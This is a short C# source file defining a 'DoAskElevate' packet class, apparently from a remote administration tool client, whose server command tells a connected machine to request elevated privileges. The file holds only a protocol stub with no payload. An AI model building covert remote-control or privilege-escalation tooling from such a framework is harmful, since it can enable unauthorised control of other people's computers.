using System;
using xLightClient.Core.Networking;

namespace xLightClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoAskElevate : IPacket
    {
        public DoAskElevate()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
